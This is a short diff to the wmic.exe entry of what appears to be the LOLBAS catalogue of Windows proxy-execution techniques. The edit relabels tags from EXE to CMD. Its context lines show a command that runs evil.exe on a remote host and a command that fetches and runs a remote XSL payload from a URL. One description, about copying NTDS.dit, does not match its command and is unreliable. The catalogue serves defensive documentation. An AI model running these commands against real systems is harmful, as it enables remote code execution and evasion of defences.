@@ -21,7 +21,7 @@ Commands:
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: EXE
+      - Execute: CMD
   - Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"
     Description: Execute evil.exe on the remote system.
     Usecase: Execute binary on a remote system
@@ -30,7 +30,7 @@ Commands:
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
     Tags:
-      - Execute: EXE
+      - Execute: CMD
       - Execute: Remote
   - Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
     Description: Create a volume shadow copy of NTDS.dit that can be copied.
